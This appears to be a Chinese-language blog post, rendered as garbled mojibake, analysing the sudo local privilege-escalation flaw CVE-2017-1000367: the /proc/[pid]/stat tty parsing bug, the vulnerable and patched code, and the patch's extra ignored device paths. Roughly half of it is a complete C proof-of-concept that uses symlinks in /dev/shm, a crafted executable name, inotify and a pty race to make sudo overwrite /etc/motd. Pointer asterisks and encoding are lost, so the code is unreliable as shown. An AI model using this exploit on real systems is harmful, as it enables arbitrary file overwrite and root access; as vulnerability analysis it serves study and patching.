I"„<h1 id="sudoæœ¬åœ°ææƒ-cve-2017-1000367-æ¼æ´åˆ†æ">sudoæœ¬åœ°ææƒ CVE-2017-1000367 æ¼æ´åˆ†æ</h1>
<p class="date">12 Jun 2017 - Tr3jer_CongRong</p>

<p>Â Â Â Â Â Â è¯¥æ¼æ´å‘ç”Ÿåœ¨/src/ttyname.cçš„<code>get_process_ttyname()</code>å‡½æ•°ï¼Œsudoåœ¨è·å–ttyè®¾å¤‡å·æ—¶æ²¡æœ‰æ­£ç¡®è§£æ/proc/[pid]/statçš„å†…å®¹ã€‚é¦–å…ˆï¼Œ/proc/[pid]çš„statåŒ…å«äº†æ‰€æœ‰çš„CPUæ´»è·ƒä¿¡æ¯ï¼Œæœ‰å…³è§¦å‘æ­¤æ¼æ´çš„ä¸¤ä¸ªstatå‚æ•°åˆ†åˆ«ä¸ºï¼š</p>
<pre><code>ç¬¬2ä¸ªï¼šcommåº”ç”¨ç¨‹åºæˆ–å‘½ä»¤çš„åå­—
ç¬¬7ä¸ªï¼štty_nrä¹Ÿå°±æ˜¯ttyè®¾å¤‡å·
</code></pre>

<p>è¿™äº›å‚æ•°æ˜¯ä½¿ç”¨ç©ºæ ¼è¿›è¡Œåˆ†å‰²çš„ï¼Œå†æ¥çœ‹çœ‹get_process_ttyname()å‡½æ•°æ˜¯æ€ä¹ˆè·å–<code>tty_nr</code>çš„ï¼š</p>

<pre><code>lenÂ =Â getline(&amp;line,Â &amp;linesize,Â fp);
fclose(fp);
ifÂ (lenÂ !=Â -1)Â {
Â Â Â Â /Â FieldÂ 7Â isÂ theÂ ttyÂ devÂ (0Â ifÂ noÂ tty)Â /
Â Â Â Â charÂ cpÂ =Â line;
Â Â Â Â charÂ epÂ =Â line;
Â Â Â Â constÂ charÂ errstr;
Â Â Â Â intÂ fieldÂ =Â 0;
Â Â Â Â whileÂ (++epÂ !=Â '\0')Â {
        ifÂ (epÂ ==Â 'Â ')Â {
Â Â Â Â         epÂ =Â '\0';
Â Â Â Â         ifÂ (++fieldÂ ==Â 7)Â {
                dev_tÂ tdevÂ =Â strtonum(cp,Â INT_MIN,Â INT_MAX,Â &amp;errstr);
                ifÂ (errstr)Â {
Â Â Â Â                 sudo_debug_printf(SUDO_DEBUG_ERROR|SUDO_DEBUG_LINENO,
                        "%s:Â ttyÂ deviceÂ %s:Â %s",Â path,Â cp,Â errstr);
</code></pre>

<p>Â Â Â Â Â Â ç¨‹åºåœ¨è·å–tty_nræ—¶ä¹Ÿå°±æ˜¯æ ¹æ®å¤šå°‘ç©ºæ ¼ä¸ªæ¥åˆ¤æ–­å½“å‰æ˜¯å“ªä¸ªå‚æ•°ï¼Œé‚£ä¹ˆä¸Šé¢æåˆ°çš„ç¬¬2ä¸ªå‚æ•°commï¼Œè¿™ä¸ªå‚æ•°æ˜¯ä»¥æ‹¬å·ç‹¬ç«‹èµ·æ¥çš„ï¼Œå¹¶ä¸”ç¨‹åºæˆ–å‘½ä»¤çš„åå­—å½“ç„¶å…è®¸åŒ…å«ç©ºæ ¼ã€‚é‚£ä¹ˆå°±å¯ä»¥é€šè¿‡æ§åˆ¶commå‚æ•°çš„ç©ºæ ¼å¯¼è‡´tty_nrçš„å€¼åŒæ ·è¢«æ§åˆ¶ï¼Œä½¿å¾—æœ¬åœ°æ”»å‡»è€…æ¥è¦†ç›–æ–‡ä»¶ç³»ç»Ÿä¸Šçš„ä»»ä½•æ–‡ä»¶ï¼Œä»è€Œç»•è¿‡é¢„æœŸæƒé™æˆ–è·å–root shellã€‚</p>

<p>Â Â Â Â Â Â å†æ¥çœ‹çœ‹è¡¥ä¸ï¼Œè¡¥ä¸ç¬¬ä¸€å¤„æ˜¯å°†get_process_ttyname()å‡½æ•°åœ¨è·å–tty_nræ—¶ä»â€™)â€™åå¼€å§‹è·å–ï¼Œè¿™æ ·é¿å…äº†commåŒ…å«ç©ºæ ¼çš„ç‰¹æ€§ï¼š</p>

<pre><code>ifÂ (nreadÂ ==Â 0Â &amp;&amp;Â memchr(buf,Â '\0',Â cpÂ -Â buf)Â ==Â NULL)Â {
Â Â Â Â /
Â Â Â Â Â Â FieldÂ 7Â isÂ theÂ ttyÂ devÂ (0Â ifÂ noÂ tty).
Â Â Â Â Â Â SinceÂ theÂ processÂ nameÂ atÂ fieldÂ 2Â "(comm)"Â mayÂ include
Â Â Â Â Â Â whitespaceÂ (includingÂ newlines),Â startÂ atÂ theÂ lastÂ ')'Â found.
Â Â Â Â Â /
Â Â Â Â cpÂ =Â '\0';
Â Â Â Â cpÂ =Â strrchr(buf,Â ')');
Â Â Â Â ifÂ (cpÂ !=Â NULL)Â {
    charÂ epÂ =Â cp;
    constÂ charÂ errstr;
    intÂ fieldÂ =Â 1;

    whileÂ (++epÂ !=Â '\0')Â {
    Â Â Â Â ifÂ (epÂ ==Â 'Â ')Â {
        epÂ =Â '\0';
        ifÂ (++fieldÂ ==Â 7)Â {
        Â Â Â Â dev_tÂ tdevÂ =Â strtonum(cp,Â INT_MIN,Â INT_MAX,Â &amp;errstr);
        Â Â Â Â ifÂ (errstr)Â {
            sudo_debug_printf(SUDO_DEBUG_ERROR|SUDO_DEBUG_LINENO,
            Â Â Â Â "%s:Â ttyÂ deviceÂ %s:Â %s",Â path,Â cp,Â errstr);
        Â Â Â Â }
        Â Â Â Â ifÂ (tdevÂ &gt;Â 0)Â {
            errnoÂ =Â serrno;
            retÂ =Â sudo_ttyname_dev(tdev,Â name,Â namelen);
            gotoÂ done;
        Â Â Â Â }
        Â Â Â Â break;
        }
        cpÂ =Â epÂ +Â 1;
    Â Â Â Â }
    }
Â Â Â Â }
}
</code></pre>

<p>ç¬¬äºŒå¤„æ˜¯æ·»åŠ äº†æœç´¢è®¾å¤‡å·å¯¹åº”çš„è®¾å¤‡åçš„ä¸¤ä¸ªåœ°å€ï¼š</p>

<pre><code>Â staticÂ charÂ ignore_devs[]Â =Â {
Â Â Â Â Â "/dev/fd/",
+Â Â Â Â "/dev/mqueue/",
+Â Â Â Â "/dev/shm/",
Â Â Â Â Â "/dev/stdin",
Â Â Â Â Â "/dev/stdout",
Â Â Â Â Â "/dev/stderr",
</code></pre>

<p>POC:</p>

<pre><code>#defineÂ _GNU_SOURCE
#includeÂ &lt;errno.h&gt;
#includeÂ &lt;linux/sched.h&gt;
#includeÂ &lt;pty.h&gt;
#includeÂ &lt;sched.h&gt;
#includeÂ &lt;signal.h&gt;
#includeÂ &lt;stdio.h&gt;
#includeÂ &lt;stdlib.h&gt;
#includeÂ &lt;string.h&gt;
#includeÂ &lt;sys/inotify.h&gt;
#includeÂ &lt;sys/resource.h&gt;
#includeÂ &lt;sys/stat.h&gt;
#includeÂ &lt;sys/types.h&gt;
#includeÂ &lt;unistd.h&gt;
#includeÂ &lt;sys/wait.h&gt;

#defineÂ EVENT_SIZEÂ Â (Â sizeofÂ (structÂ inotify_event)Â )
#defineÂ EVENT_BUF_LENÂ Â Â Â Â (Â 1024Â Â (Â EVENT_SIZEÂ +Â 16Â )Â )


intÂ main(Â )
{

    intÂ length,Â iÂ =Â 0;
Â Â intÂ fd;
Â Â intÂ wd;
Â Â charÂ buffer[EVENT_BUF_LEN];

    intÂ master,Â slave;
    charÂ pts_path[256];

    cpu_set_tÂ Â mask;
    structÂ sched_paramÂ params;
    params.sched_priorityÂ =Â 0;
    CPU_ZERO(&amp;mask);
    CPU_SET(0,Â &amp;mask);

    mkdir("/dev/shm/_tmp",Â 0755);
    symlink("/dev/pts/57",Â "/dev/shm/_tmp/_tty");
    symlink("/usr/bin/sudo",Â "/dev/shm/_tmp/Â Â Â Â Â 34873Â ");

    fdÂ =Â inotify_init();
    wdÂ =Â inotify_add_watch(Â fd,Â "/dev/shm/_tmp",Â IN_OPENÂ |Â IN_CLOSE_NOWRITEÂ );

Â     pid_tÂ pidÂ =Â fork();

    if(pidÂ ==Â 0)Â {
        sched_setaffinity(pid,Â sizeof(mask),Â &amp;mask);
        sched_setscheduler(pid,Â SCHED_IDLE,Â &amp;params);
        setpriority(PRIO_PROCESS,Â pid,Â 19);

        sleep(1);
        execlp("/dev/shm/_tmp/Â Â Â Â Â 34873Â ",Â "sudo",Â "-r",Â "unconfined_r",Â "/usr/bin/sum",Â "â€”\nHELLO\nWORLD\n",Â NULL);
    }else{
        setpriority(PRIO_PROCESS,Â 0,Â -20);
        intÂ stateÂ =Â 0;
        while(1)Â {
            lengthÂ =Â read(Â fd,Â buffer,Â EVENT_BUF_LENÂ );
            kill(pid,Â SIGSTOP);

            i=0;
            whileÂ (Â iÂ &lt;Â lengthÂ )Â {
                structÂ inotify_eventÂ eventÂ =Â (Â structÂ inotify_eventÂ *Â )Â &amp;buffer[Â iÂ ];

                ifÂ (Â event-&gt;maskÂ &amp;Â IN_OPENÂ )Â {
                    //kill(pid,Â SIGSTOP);

                    while(strcmp(pts_path,"/dev/pts/57")){
                        openpty(&amp;master,Â &amp;slave,Â &amp;pts_path[0],Â NULL,Â NULL);
                    };
                    //kill(pid,Â SIGCONT);
                    break;

                }elseÂ ifÂ (Â event-&gt;maskÂ &amp;Â IN_CLOSE_NOWRITEÂ )Â {
                    //kill(pid,Â SIGSTOP);

                    unlink("/dev/shm/_tmp/_tty");
                    symlink("/etc/motd",Â "/dev/shm/_tmp/_tty");
                    //kill(pid,Â SIGCONT);

                    stateÂ =Â 1;
                    break;
                }

                iÂ +=Â EVENT_SIZEÂ +Â event-&gt;len;

            }
            kill(pid,Â SIGCONT);
            if(stateÂ ==Â 1)Â break;
        }

        waitpid(pid,Â NULL,Â 0);
        inotify_rm_watch(Â fd,Â wdÂ );
        close(Â fdÂ );
        close(wd);

        unlink("/dev/shm/_tmp/_tty");
        unlink("/dev/shm/_tmp/Â Â Â Â Â 34873Â ");
        rmdir("/dev/shm/_tmp");
        close(master);
        close(slave);
    }

}
</code></pre>

<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/4refdergth.png" /></p>

:ET